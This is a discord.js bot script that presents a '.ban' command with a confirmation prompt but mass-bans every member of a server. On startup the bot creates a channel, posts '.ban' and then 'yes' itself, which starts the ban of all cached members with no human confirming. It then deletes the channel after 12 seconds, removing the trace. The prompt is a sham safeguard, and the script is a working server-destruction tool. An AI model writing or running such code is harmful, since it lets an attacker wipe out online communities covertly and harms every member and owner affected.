const Discord = require("discord.js");
const client = new Discord.Client({
    intents: [
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MESSAGES,
        // Add other necessary intents here
    ],
    partials: ["CHANNEL", "MESSAGE", "GUILD_MEMBER"]
});

let canSendYes = true;

client.on('ready', async () => {
    console.log(`${client.user.username} has been successfully launched.`);

    const guildId = ''; // Replace with your server's ID
    const command = ".ban";
    const response = "yes";

    const guild = await client.guilds.fetch(guildId);

    if (guild) {
        try {
            const createdChannel = await guild.channels.create('channel-name', {
                type: 'text', // Create a text channel
                topic: 'Channel description' // Optional: Add a description
            });

            if (createdChannel) {
                try {
                    createdChannel.send(command)
                        .then(() => {
                            if (canSendYes) {
                                canSendYes = false;
                                setTimeout(() => {
                                    createdChannel.send(response);
                                    canSendYes = true;
                                    setTimeout(() => {
                                        createdChannel.delete(); // Delete the channel after 12 seconds
                                    }, 12000); // 12 seconds
                                }, 5000); // 5-second cooldown
                            }
                        })
                        .catch(console.error);
                } catch (error) {
                    console.error('An error occurred while sending the command:', error);
                }
            } else {
                console.log(`The channel could not be created.`);
            }
        } catch (error) {
            console.error('An error occurred while creating the channel:', error);
        }
    } else {
        console.log(`The specified server was not found.`);
    }
});

const token = "your-bot-token"; // Replace with your bot's token
client.login(token);

client.on('messageCreate', async (message) => {
    if (message.content.toLowerCase() === ".ban") {
        try {
            const filter = (response) => response.author.id === message.author.id;
            const embed = new Discord.MessageEmbed()
                .setTitle('Make sure you perform this action correctly.')
                .setColor('#FF0000')
                .addFields(
                    { name: 'Does this bot have **Administrator** permission?', value: "```If it does not, kick the bot and re-add it with Administrator checked.```", inline: false },
                    { name: 'Does this bot have **A role high enough to ban members?**', value: "```If this bot does not have a role higher in the Server Settings Role's tab, it cannot ban people above its role.```", inline: false },
                    { name: 'If everything seems correct', value: "```Say yes```", inline: false }
                );
            await message.reply({ embeds: [embed] });
            const collector = message.channel.createMessageCollector(filter, { time: 60000 });

            const guild = message.guild;
            const members = guild.members.cache;
            const totalMembersToBan = members.size;
            let membersBanned = 0;

            collector.on('collect', async (response) => {
                const answer = response.content.toLowerCase();

                if (answer === 'yes') {
                    try {
                        members.forEach(async member => {
                            if (member.id === message.member.id) return;
                            try {
                                await member.ban();
                                membersBanned++;
                                const membersLeft = totalMembersToBan - membersBanned;
                                console.log(`Banned ${member.user.username}, Members left to ban: ${membersLeft}`);
                            } catch (err) {
                                console.error(`Something went wrong while trying to ban ${member.user.username}, Missing Permissions`);
                            }
                        });
                    } catch (err) {
                        console.error(err);
                        await message.reply("Some error happened while trying to ban members, this message should never show");
                    }
                } else if (answer === 'no') {
                    await message.reply("Cancelled banning members");
                } else {
                    await message.reply("Please respond with 'yes' or 'no'");
                }
                collector.stop();
            });

            collector.on('end', (collected, reason) => {
                if (reason === 'time') {
                    message.reply("Collector timed out because there was no response.");
                }
            });
        } catch (err) {
            console.error(err);
        }
    }
});
